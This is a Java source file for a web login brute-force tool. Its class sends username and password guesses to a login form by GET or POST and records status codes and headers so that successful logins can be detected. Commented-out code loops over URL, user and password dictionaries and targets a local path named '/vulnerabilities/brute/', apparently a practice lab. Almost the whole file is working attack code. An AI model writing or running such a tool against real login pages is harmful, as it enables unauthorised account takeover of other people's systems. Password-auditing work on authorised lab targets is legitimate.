package mods.BruteForce;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;
import java.util.Vector;
import java.util.concurrent.Callable;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

public class BruteForce implements Callable<Vector<String>>{
	
	public final static int METHOD_GET=0;
	public final static int METHOD_POST=1;
	private int method_flag;
//	public Vector<Vector<String>> result=new Vector<Vector<String>>();
//	private ArrayList<String> urllist;
//	private ArrayList<String> userDire=new ArrayList<String>();
//	private ArrayList<String> passwordDire=new ArrayList<String>();
	
	private Vector<String> result=new Vector<String>();
	private String url;
	private String user;
	private String password;
	
	public BruteForce(String url,String user,String pw,int method)
	{
		this.url=url;
		this.user=user;
		this.password=pw;
		this.method_flag=method;
	}

	public synchronized void BruteForceGet()
	{
		HttpClient httpclient=new DefaultHttpClient();
		String geturlstr=url+"?username="+user+"&password="+password+"&Login=Login";
		HttpGet httpget=new HttpGet(geturlstr);
		HttpResponse res;
		try {
			res=httpclient.execute(httpget);
			
			int statuscode=res.getStatusLine().getStatusCode();
			Header head=res.getFirstHeader("Location");
			result.add(url);
			result.add(user);
			result.add(password);
			result.add(String.valueOf(statuscode));
			result.add(head.getValue());
			head=res.getFirstHeader("Content-Length");
			result.add(head.getValue());
			

	
		} catch (ClientProtocolException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	
	}
	
	public synchronized void BruteForcePost()
	{
		HttpClient httpclient=new DefaultHttpClient();
		HttpPost httppost=new HttpPost(url);
		HttpResponse res;

		List<NameValuePair> params=new ArrayList<NameValuePair>();
		params.add(new BasicNameValuePair("username", user));
		params.add(new BasicNameValuePair("password", password));
		params.add(new BasicNameValuePair("Login", "Login"));

		UrlEncodedFormEntity uefentitu;
		try {
			uefentitu=new UrlEncodedFormEntity(params,"UTF-8");	
			httppost.setEntity(uefentitu);
			res=httpclient.execute(httppost);
			
			int statuscode=res.getStatusLine().getStatusCode();
			Header head=res.getFirstHeader("Location");
			result.add(url);
			result.add(user);
			result.add(password);
			result.add(String.valueOf(statuscode));
			result.add(head.getValue());
			head=res.getFirstHeader("Content-Length");
			result.add(head.getValue());
			
		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClientProtocolException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
//	public static void main(String[] args)
//	{
//		
//		BruteForce bf=new BruteForce();
//		
//		bf.BruteForcePost("http://192.168.1.102/login.php", "admin", "password");
//		String url="http://192.168.1.102/vulnerabilities/brute/";	
//		HttpClient httpclient=new DefaultHttpClient();
//		//HttpHost targethost=new HttpHost(url);
//		HttpGet httpget=new HttpGet(url);
//        HttpResponse res;
//		try {
//			res = httpclient.execute(httpget);
//	        HttpEntity entity = res.getEntity();		
//			if(entity==null)
//				System.out.println("entity is null");
//			HttpPost httppost=new HttpPost(url);
//			//httppost.setHeaders(res.getAllHeaders());
//			List<NameValuePair> params=new ArrayList<NameValuePair>();
//			params.add(new BasicNameValuePair("password", "hgfdhg"));
//			params.add(new BasicNameValuePair("username", "admin"));
//			httppost.setEntity(new UrlEncodedFormEntity(params));
//			HttpClient loginclient=new DefaultHttpClient();
//			HttpResponse loginres=loginclient.execute(httppost);
//			Header head=loginres.getLastHeader("Content-Length");
//			if(head==null)
//			{
//				System.out.println("head is null");	
//				return;
//			}
//			System.out.println(loginres.toString());
//		} catch (ClientProtocolException e) {
//			// TODO Auto-generated catch block
//			e.printStackTrace();
//		} catch (IOException e) {
//			// TODO Auto-generated catch block
//			e.printStackTrace();
//		}
//	}

	
//	@Override
//	public void run() 
//	{
//		// TODO Auto-generated method stub
//		
//		if(method_flag==METHOD_GET)
//		{
//			synchronized (urllist) 
//			{
//				for(int n=0;n<urllist.size();n++)
//				{
//					String tempurl=urllist.get(n);
//					synchronized (userDire) 
//					{
//						for(int i=0;i<userDire.size();i++)
//						{
//							String tempuser=userDire.get(i);
//							synchronized (passwordDire) 
//							{
//								for(int j=0;j<passwordDire.size();j++)
//								{
//									String temppw=passwordDire.get(j);
//									BruteForceGet(tempurl, tempuser, temppw);
//								}
//							}
//						}
//					}
//				}
//			}	
//		}
//		if(method_flag==METHOD_POST)
//		{
//			synchronized (urllist) 
//			{
//				for(int n=0;n<urllist.size();n++)
//				{
//					String tempurl=urllist.get(n);
//					synchronized (userDire) 
//					{
//						for(int i=0;i<userDire.size();i++)
//						{
//							String tempuser=userDire.get(i);
//							synchronized (passwordDire) 
//							{
//								for(int j=0;j<passwordDire.size();j++)
//								{
//									String temppw=passwordDire.get(j);
//									BruteForcePost(tempurl, tempuser, temppw);
//									System.out.println("n="+n+" i="+i+" j="+j);
//								}
//							}
//						}
//					}
//				}
//			}
//		}		
//	}

	@Override
	public Vector<String> call() throws Exception
	{
		// TODO Auto-generated method stub
		if(method_flag==METHOD_GET)
		{
			BruteForceGet();
		}
		if(method_flag==METHOD_POST)
		{
			BruteForcePost();
		}
		return result;
	}

}
